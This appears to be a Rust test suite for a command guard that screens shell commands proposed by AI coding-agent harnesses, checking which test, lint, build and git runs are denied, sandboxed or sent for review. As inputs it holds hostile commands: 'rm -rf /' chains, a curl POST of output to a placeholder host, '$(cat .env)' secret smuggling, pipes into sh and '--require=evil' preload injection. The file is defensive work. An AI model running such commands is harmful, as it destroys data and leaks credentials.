use guard_command::pretool::evaluate_pre_tool_envelope_with_context;
use serde_json::json;

fn classify(harness: &str, command: &str) -> guard_contracts::PreToolResultV1 {
    evaluate_pre_tool_envelope_with_context(
        harness,
        "PreToolUse",
        &json!({"tool_name":"bash","tool_input":{"command":command}}),
        None,
        None,
        Some("/home/tester"),
        Some("/home/tester/project"),
    )
}

#[test]
fn isolated_python_inline_code_requires_containment_not_unrestricted_allow() {
    for flags in ["-I", "-S", "-I -S", "-S -I", "-IS", "-SI"] {
        let command = format!("python3 {flags} -c 'print(1)'");
        let result = classify("omp", &command);
        assert_eq!(result.decision, "deny", "{command}");
        if cfg!(target_os = "macos") {
            assert_eq!(result.minimum_action, "sandbox-required", "{command}");
            assert_eq!(
                result.reason_code, "native_python_eval_readonly_containment_required",
                "{command}"
            );
        }
    }
    for command in [
        "python3 -I -m arbitrary",
        "python3 -S file.py",
        "python3 -W ignore -c 'print(1)'",
        "python3 -I -I -c 'print(1)'",
        "python3 -IS -S -c 'print(1)'",
        "python3 -I -S -c 'print(1)' extra",
        "PYTHONPATH=/tmp python3 -I -S -c 'print(1)'",
        "python3 -I -S -c 'print(1)' && rm -rf /",
    ] {
        let result = classify("omp", command);
        assert_ne!(result.decision, "allow", "{command}");
        assert_ne!(
            result.reason_code, "native_python_eval_readonly_containment_required",
            "{command}"
        );
    }
}

#[test]
fn test_named_python_scripts_share_the_inline_eval_boundary() {
    for command in [
        "python3 test_calc.py",
        "python test_calc.py -v",
        "python3 -I tests/test_parser.py",
        "/usr/bin/python3.12 src/calc_test.py",
        "python3 run_tests.py",
        "python3 tests.py",
    ] {
        let result = classify("omp", command);
        assert_eq!(result.decision, "deny", "{command}");
        if cfg!(target_os = "macos") {
            assert_eq!(result.minimum_action, "sandbox-required", "{command}");
            assert_eq!(
                result.reason_code, "native_python_eval_readonly_containment_required",
                "{command}"
            );
        }
    }
    for command in [
        "python3 deploy.py",
        "python3 testing.py",
        "python3 test_calc.sh",
        "python3 ../test_calc.py",
        "python3 /tmp/test_calc.py",
        "python3 ~/test_calc.py",
        "python3 -m test_calc",
        "python3 -W ignore test_calc.py",
        "python3 'test calc.py'",
        "python3 test_calc.py > out.txt",
        "python3 test_calc.py && rm -rf /",
        "PYTHONPATH=/tmp python3 test_calc.py",
        "sudo python3 test_calc.py",
    ] {
        assert_ne!(
            classify("omp", command).reason_code,
            "native_python_eval_readonly_containment_required",
            "{command}"
        );
    }
}

#[test]
fn unittest_and_final_status_echo_share_the_readonly_boundary() {
    for (command, reason) in [
        (
            "python3 -m unittest",
            "native_python_eval_readonly_containment_required",
        ),
        (
            "python3 -m unittest -q",
            "native_python_eval_readonly_containment_required",
        ),
        (
            "python -I -m unittest discover -s tests -p 'test_*.py'",
            "native_python_eval_readonly_containment_required",
        ),
        (
            "python3 -m unittest -q 2>&1",
            "native_python_eval_readonly_containment_required",
        ),
        (
            r#"python3 -m unittest -q 2>&1; echo "exit=$?""#,
            "native_python_eval_readonly_containment_required",
        ),
        (
            r#"python3 test_calc.py; echo "EXIT CODE: $?""#,
            "native_python_eval_readonly_containment_required",
        ),
        (
            r#"python3 -m pytest -q 2>&1 | tail -20; echo "exit=$?""#,
            "native_pytest_readonly_containment_required",
        ),
    ] {
        let result = classify("omp", command);
        assert_eq!(result.decision, "deny", "{command}");
        assert!(!result.explicitly_benign, "{command}");
        if cfg!(target_os = "macos") {
            assert_eq!(result.minimum_action, "sandbox-required", "{command}");
            assert_eq!(result.reason_code, reason, "{command}");
        }
    }
    for command in [
        "python3 -m unittestx",
        "python3 -m unittest 'a;b'",
        "python3 -m unittest && rm -rf /",
        "python3 -m unittest; rm -rf /",
        r#"python3 -m unittest; echo "exit=$?"; rm -rf /"#,
        r#"python3 -m unittest && echo "exit=$?""#,
        r#"python3 -m unittest; echo "exit=$?" > out.txt"#,
        r#"python3 -m unittest; echo "$(id)$?""#,
        r#"python3 -m unittest; echo "exit=$?" "$?""#,
        "python3 -m unittest 2>&1 > out.txt",
        r#"python3 -m unittest; echo 'exit=$?'"#,
        r#"python3 -m unittest; echo exit=\$?"#,
        r#"rm -rf build; echo "exit=$?""#,
        "sudo python3 -m unittest",
        "PYTHONPATH=/tmp python3 -m unittest",
    ] {
        let result = classify("omp", command);
        assert_ne!(result.decision, "allow", "{command}");
        assert!(
            !matches!(
                result.reason_code.as_str(),
                "native_python_eval_readonly_containment_required"
                    | "native_pytest_readonly_containment_required"
            ),
            "{command}"
        );
    }
}

#[test]
fn local_transform_service_is_containment_only_and_argv_bounded() {
    let command = "/home/tester/project/node_modules/@esbuild/darwin-arm64/bin/esbuild --service=0.25.4 --ping";
    let result = classify("omp", command);
    assert_ne!(result.decision, "allow");
    if cfg!(target_os = "macos") {
        assert_eq!(
            result.reason_code,
            "native_vitest_readonly_containment_required"
        );
        assert_eq!(result.minimum_action, "sandbox-required");
    }
    for command in [
        "esbuild --service=0.25.4 --ping",
        "/outside/esbuild --service=0.25.4 --ping",
        "/home/tester/project/node_modules/@esbuild/darwin-arm64/bin/esbuild --service=evil --ping",
        "/home/tester/project/node_modules/@esbuild/darwin-arm64/bin/esbuild --service=0.25.4 --ping --outfile=app.js",
    ] {
        assert_ne!(classify("omp", command).reason_code, "native_vitest_readonly_containment_required");
    }
}

#[test]
fn direct_pytest_requires_real_containment_never_direct_allow() {
    for command in [
        "python3 -m pytest -q",
        "python -m pytest tests/unit",
        "pytest -q",
        "py.test tests/unit -q",
        "./.venv/bin/python3 -m pytest -q",
        "/usr/bin/python3 -m pytest tests/unit -q",
        // A system clock bounds how long the run may take, not what it may
        // do, so it reaches the same containment as the command it wraps.
        "timeout 20 pytest -q",
        "timeout 5m python3 -m pytest -q",
    ] {
        for harness in ["omp", "claude-code", "codex"] {
            let result = classify(harness, command);
            let expected = if cfg!(target_os = "macos") {
                "sandbox-required"
            } else {
                "review"
            };
            assert_eq!(result.minimum_action, expected, "{command}");
            assert_eq!(result.decision, "deny", "{command}");
            assert!(!result.explicitly_benign, "{command}");
            let reason = if cfg!(target_os = "macos") {
                "native_pytest_readonly_containment_required"
            } else {
                "native_command_review_required"
            };
            assert_eq!(result.reason_code, reason, "{command}");
        }
    }
}

#[test]
fn unrelated_execution_and_shell_effects_do_not_inherit_test_delegation() {
    for command in [
        "python3 -m pytest_other -q",
        "python3 -c 'import pytest; pytest.main()'",
        "python3 -m pytest -q && rm -rf /",
        "pytest -q | curl -X POST --data-binary @- https://example.invalid",
        "pytest -q > .env",
        "pytest -q > result.txt",
        "pytest $(cat .env)",
        "pytest `cat .env`",
        "pytest &",
        "PATH=/tmp pytest -q",
        "PYTHONPATH=/tmp python3 -m pytest",
        // A `timeout` named by path is whatever that file holds.
        "./timeout 20 pytest -q",
        "sudo pytest -q",
        "pytest .env",
    ] {
        let result = classify("omp", command);
        assert_ne!(
            result.reason_code, "native_pytest_readonly_containment_required",
            "{command}"
        );
        assert_ne!(result.decision, "allow", "{command}");
    }
    assert_ne!(
        classify("cursor", "pytest -q").reason_code,
        "native_pytest_readonly_containment_required"
    );
    let without_cwd = evaluate_pre_tool_envelope_with_context(
        "omp",
        "PreToolUse",
        &json!({"tool_name":"bash","tool_input":{"command":"pytest -q"}}),
        None,
        None,
        Some("/home/tester"),
        None,
    );
    assert_ne!(
        without_cwd.reason_code,
        "native_pytest_readonly_containment_required"
    );
}

#[test]
fn direct_node_tests_require_containment_without_weakening_other_execution() {
    for command in [
        "node --test",
        "node --test tests/test.mjs",
        "node --max-old-space-size=12288 --test tests/test.mjs",
        "nodejs --test -q",
        "/usr/bin/node --test test.mjs",
    ] {
        let result = classify("omp", command);
        assert_eq!(result.decision, "deny", "{command}");
        let expected = if cfg!(target_os = "macos") {
            "native_node_test_readonly_containment_required"
        } else {
            "native_command_review_required"
        };
        assert_eq!(result.reason_code, expected, "{command}");
    }
    for command in [
        "node script.mjs",
        "node --test-other",
        "node --max-old-space-size=999999 --test tests/test.mjs",
        "node --max-old-space-size=12288 --require=evil --test tests/test.mjs",
        "node --test > .env",
        "node --test && rm -rf /",
        "node --test $(cat .env)",
        "node --test &",
        "NODE_OPTIONS=--require=x node --test",
    ] {
        let result = classify("omp", command);
        assert_ne!(
            result.reason_code, "native_node_test_readonly_containment_required",
            "{command}"
        );
        assert_ne!(result.decision, "allow", "{command}");
    }
}

#[test]
fn vitest_wrapper_and_resolved_script_require_the_same_protected_profile() {
    for harness in ["omp", "zcode", "claude-code"] {
        for command in [
            "bunx vitest run tests/example.test.ts",
            "bun x vitest run tests/example.test.ts",
            "bun --cwd /project x vitest run tests/example.test.ts",
            "bun --cwd=/project x --no-install vitest run tests/example.test.ts",
            "bunx vitest run __tests__/one.test.ts __tests__/two.test.ts",
            "npx --no-install vitest run",
            "pnpm exec vitest run __tests__/one.test.ts",
            "vitest run",
            "node /home/tester/project/node_modules/vitest/vitest.mjs run tests/example.test.ts",
        ] {
            let result = classify(harness, command);
            assert_eq!(result.decision, "deny", "{command}");
            let expected = if cfg!(target_os = "macos") {
                "native_vitest_readonly_containment_required"
            } else if command.starts_with("bun ") || command.starts_with("pnpm ") {
                "native_package_review"
            } else {
                "native_command_review_required"
            };
            assert_eq!(result.reason_code, expected, "{command}");
        }
        for command in [
            "bunx vitest@evil run",
            "bun --cwd /project x vitest@evil run",
            "bun --cwd /project x vitest watch",
            "bun --cwd /project x vitest run && rm -rf /",
            "bunx other run",
            "vitest watch",
            "bunx vitest run && rm -rf /",
            "bunx vitest run $(cat .env)",
            "bunx vitest run > .env",
            "pnpm exec vitest watch",
            "pnpm exec -c vitest run",
            "pnpm exec --filter app vitest run",
            "pnpm -r exec vitest run",
            "pnpm --dir /elsewhere exec vitest run",
            "pnpm exec vitest run && rm -rf /",
        ] {
            let result = classify(harness, command);
            if command == "python3 test_calc.py" && harness != "zcode" {
                assert_eq!(result.decision, "deny", "{harness} {command}");
            }
            assert_ne!(
                result.reason_code, "native_vitest_readonly_containment_required",
                "{command}"
            );
            assert_ne!(result.decision, "allow", "{command}");
        }
    }
}

#[test]
fn git_inspections_require_protected_execution_not_helper_consent() {
    for command in [
        "git diff --stat",
        "git diff --check",
        "git log --oneline -1",
        "git show HEAD",
    ] {
        let result = classify("omp", command);
        assert_eq!(result.decision, "deny");
        assert_eq!(
            result.reason_code,
            if cfg!(target_os = "macos") {
                "native_git_readonly_containment_required"
            } else {
                "native_git_helper_context_review"
            },
            "{command}"
        );
    }
    for command in [
        "git diff --ext-diff",
        "git diff --textconv",
        "git diff --output=out.txt",
        "git show HEAD:.env",
        "git diff; rm -rf /",
        "git diff | sh",
        "git reset --hard",
    ] {
        assert_ne!(
            classify("omp", command).reason_code,
            "native_git_readonly_containment_required",
            "{command}"
        );
    }
}

#[test]
fn inline_data_analysis_requires_real_readonly_enforcement() {
    for (command, runtime) in [
        (
            "python3 -c 'import json; print(json.loads(\"[1,2,3]\"))'",
            "python",
        ),
        (
            "/usr/bin/python3.14 -c 'import json; print(json.loads(\"[1,2,3]\"))'",
            "python",
        ),
        ("node -e 'console.log(JSON.parse(\"[1,2,3]\"))'", "node"),
    ] {
        let result = classify("omp", command);
        assert_eq!(result.decision, "deny", "{command}");
        if cfg!(target_os = "macos") {
            assert_eq!(
                result.reason_code,
                format!("native_{runtime}_eval_readonly_containment_required"),
                "{command}: {result:?}"
            );
        }
    }
    for command in [
        "python3 -c 'import json' && rm -rf /",
        "node -e '1' | sh",
        "sudo python3 -c '1'",
        "node --require preload.js -e '1'",
        "python3 file.py",
        "node file.js",
    ] {
        let result = classify("omp", command);
        assert_ne!(
            result.reason_code, "native_python_eval_readonly_containment_required",
            "{command}"
        );
        assert_ne!(
            result.reason_code, "native_node_eval_readonly_containment_required",
            "{command}"
        );
    }
}

#[test]
fn package_tests_require_manifest_resolution_and_protected_execution() {
    for command in [
        "npm test",
        "npm test -- test/unit.js",
        "npm run test",
        "pnpm run test",
        "bun run test",
    ] {
        let result = classify("omp", command);
        assert_eq!(result.decision, "deny", "{command}");
        if cfg!(target_os = "macos") {
            assert_eq!(
                result.reason_code, "native_package_test_readonly_containment_required",
                "{command}"
            );
        }
    }
    for command in [
        "npm run other",
        "npm test --prefix /tmp/project",
        "npm test && rm -rf /",
        "npm test | sh",
        "NODE_OPTIONS=--require=x npm test",
    ] {
        assert_ne!(
            classify("omp", command).reason_code,
            "native_package_test_readonly_containment_required",
            "{command}"
        );
    }
}

#[test]
fn local_lint_typecheck_requires_actual_protected_execution() {
    for command in [
        "bun run lint",
        "npm run typecheck",
        "bunx tsc --noEmit",
        "pnpm exec tsc --noEmit --pretty false",
        "pnpm exec eslint src",
        "pnpm exec prettier --check src",
        "bunx prettier --list-different .",
        "npx prettier -c src",
        "eslint src",
        "prettier --check .",
        "node /home/tester/project/node_modules/prettier/bin/prettier.cjs --check src",
        "node /home/tester/project/node_modules/prettier/bin-prettier.js --check src",
        "node /home/tester/project/node_modules/eslint/bin/eslint.js src",
        "node /home/tester/project/node_modules/typescript/bin/tsc --noEmit",
        "node --max-old-space-size=12288 /home/tester/project/node_modules/typescript/bin/tsc --noEmit --incremental false",
    ] {
        let result = classify("omp", command);
        assert_eq!(result.decision, "deny", "{command}");
        if cfg!(target_os = "macos") {
            assert_eq!(
                result.reason_code, "native_node_tool_readonly_containment_required",
                "{command}"
            );
        }
    }
    for command in [
        "bun run arbitrary",
        "bunx eslint@evil src",
        "tsc",
        "eslint --fix src",
        "eslint --output-file=.env src",
        "bunx tsc --noEmit && rm -rf /",
        "pnpm exec tsc",
        "pnpm exec -c tsc --noEmit",
        "pnpm --filter app exec tsc --noEmit",
        "pnpm exec eslint --fix src",
        "prettier .",
        "prettier --write src",
        "npx prettier --check src --write",
        "pnpm exec prettier src",
        "bunx prettier -w .",
        // A value spelling turns the same rewrite on.
        "npx prettier --check --write=true src",
        "pnpm exec tsc --noEmit && rm -rf /",
        "NODE_OPTIONS=--require=x eslint src",
        "node --require=evil /home/tester/project/node_modules/typescript/bin/tsc --noEmit",
        "node --max-old-space-size=999999 /home/tester/project/node_modules/typescript/bin/tsc --noEmit",
        "node --max-old-space-size=12288 --require=evil /home/tester/project/node_modules/typescript/bin/tsc --noEmit",
    ] {
        assert_ne!(
            classify("omp", command).reason_code,
            "native_node_tool_readonly_containment_required",
            "{command}"
        );
    }
}

#[test]
fn build_requires_bounded_outputs_and_never_direct_execution() {
    for command in [
        "bun run build",
        "vite build",
        "bunx vite build",
        "node /home/tester/project/node_modules/vite/bin/vite.js build --configLoader runner",
    ] {
        let result = classify("omp", command);
        assert_eq!(result.decision, "deny", "{command}");
        if cfg!(target_os = "macos") {
            assert_eq!(
                result.reason_code, "native_node_build_output_containment_required",
                "{command}"
            );
        }
    }
    for command in [
        "vite dev",
        "vite build && rm -rf /",
        "vite build --outDir .env",
        "PATH=/tmp vite build",
    ] {
        assert_ne!(
            classify("omp", command).reason_code,
            "native_node_build_output_containment_required",
            "{command}"
        );
    }
}

#[test]
fn windows_contains_only_python_runs_from_harnesses_with_a_sink_command() {
    for harness in ["claude-code", "codex", "omp", "pi"] {
        let contained = classify(harness, "python3 test_calc.py");
        assert_eq!(contained.decision, "deny", "{harness}");
        if cfg!(target_os = "macos") || cfg!(windows) {
            assert_eq!(contained.minimum_action, "sandbox-required", "{harness}");
            assert_eq!(
                contained.reason_code, "native_python_eval_readonly_containment_required",
                "{harness}"
            );
        }
    }
    if cfg!(windows) {
        let resolved = classify(
            "claude-code",
            r"'C:\Program Files\Python312\python.exe' test_calc.py",
        );
        assert_eq!(resolved.minimum_action, "sandbox-required");
        assert_eq!(
            resolved.reason_code,
            "native_python_eval_readonly_containment_required"
        );
        for (harness, command) in [
            ("zcode", "python3 test_calc.py"),
            ("codex", "node -e 'console.log(1)'"),
            ("claude-code", "node -e 'console.log(1)'"),
            ("omp", "node -e 'console.log(1)'"),
            ("claude-code", "python3 -m pytest"),
        ] {
            let result = classify(harness, command);
            if command == "python3 test_calc.py" && harness != "zcode" {
                assert_eq!(result.decision, "deny", "{harness} {command}");
            }
            assert_ne!(
                result.minimum_action, "sandbox-required",
                "{harness} {command}"
            );
        }
    }
}

#[cfg(windows)]
#[test]
fn windows_contains_direct_vite_builds_of_a_flat_install() {
    let root = std::env::temp_dir().join(format!("hg-vite-build-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&root);
    std::fs::create_dir_all(&root).unwrap();
    // A harness reports its directory in the long, drive-letter spelling. The
    // temporary directory can arrive as an 8.3 short name (`RUNNER~1` on CI
    // runners), which the cd proof rightly declines as an alias.
    let root = std::fs::canonicalize(&root).unwrap();
    // Canonicalization answers in the verbatim spelling: `\\?\C:\...` for a
    // drive and `\\?\UNC\server\share\...` for a share. Dropping the prefix
    // off the share form would leave a relative path, so give it back its
    // leading separators, and leave a non-verbatim answer as it stands.
    let canonical = root.to_str().unwrap();
    let root = std::path::PathBuf::from(match canonical.strip_prefix(r"\\?\") {
        Some(share) => match share.strip_prefix(r"UNC\") {
            Some(share) => format!(r"\\{share}"),
            None => share.to_owned(),
        },
        None => canonical.to_owned(),
    });
    let app = root.join("dashboard");
    std::fs::create_dir_all(app.join("node_modules/vite/bin")).unwrap();
    std::fs::create_dir_all(app.join("node_modules/.bin")).unwrap();
    std::fs::write(
        app.join("package.json"),
        r#"{"scripts":{"build":"vite build"}}"#,
    )
    .unwrap();
    std::fs::write(app.join("node_modules/vite/bin/vite.js"), "").unwrap();
    std::fs::write(app.join("node_modules/.bin/vite"), "").unwrap();
    let workspace = root.to_str().unwrap();
    // The hook bridge stamps an environment without CDPATH, which proves a
    // bare `cd dashboard`.
    let environment = guard_contracts::GuardExecutionEnvironmentV1 {
        path: std::env::var("PATH").unwrap(),
        environment_names: vec!["PATH".to_owned()],
        environment_digest: "0".repeat(64),
        home: Some(r"C:\Users\tester".to_owned()),
        git_pager_disabled: false,
        pager_disabled: false,
        xdg_config_home: None,
        git_config_no_system: false,
        library_search_paths: Default::default(),
    };
    let classify_in = |harness: &str, command: &str, cwd: &str| {
        guard_command::pretool::evaluate_pre_tool_envelope_with_execution_context(
            harness,
            "PreToolUse",
            &json!({"tool_name":"bash","tool_input":{"command":command}}),
            None,
            None,
            guard_command::pretool::PathContext {
                home_dir: Some(r"C:\Users\tester"),
                cwd: Some(cwd),
                cdpath_unset: true,
                rustup_override_absent: false,
                npm_config_inert: false,
                pip_config_inert: false,
                shell_home_matches: false,
                ripgrep_config_absent: false,
                psql_environment: Default::default(),
            },
            Some(&environment),
        )
    };
    let entry = app
        .join("node_modules/vite/bin/vite.js")
        .to_string_lossy()
        .replace('\\', "/");
    let resolved = format!(r"'C:\Program Files\nodejs\node.exe' {entry} build");
    for harness in ["claude-code", "omp", "pi"] {
        for (command, cwd) in [
            (
                "cd dashboard && ./node_modules/.bin/vite build 2>&1 | tail -15",
                workspace,
            ),
            ("npx vite build", app.to_str().unwrap()),
            (resolved.as_str(), app.to_str().unwrap()),
        ] {
            let result = classify_in(harness, command, cwd);
            assert_eq!(
                result.minimum_action, "sandbox-required",
                "{harness} {command}"
            );
            assert_eq!(
                result.reason_code, "native_node_build_output_containment_required",
                "{harness} {command}"
            );
        }
    }
    let app_dir = app.to_str().unwrap();
    for (harness, command) in [
        ("codex", "npx vite build"),
        ("omp", "npm run build"),
        ("omp", "npx vite build --outDir ../elsewhere"),
    ] {
        let result = classify_in(harness, command, app_dir);
        assert_ne!(
            result.minimum_action, "sandbox-required",
            "{harness} {command}"
        );
    }
    // A pnpm store links packages across directories and is not staged.
    std::fs::create_dir(app.join("node_modules/.pnpm")).unwrap();
    let pnpm = classify_in("omp", "npx vite build", app_dir);
    assert_ne!(pnpm.minimum_action, "sandbox-required");
    let _ = std::fs::remove_dir_all(&root);
}
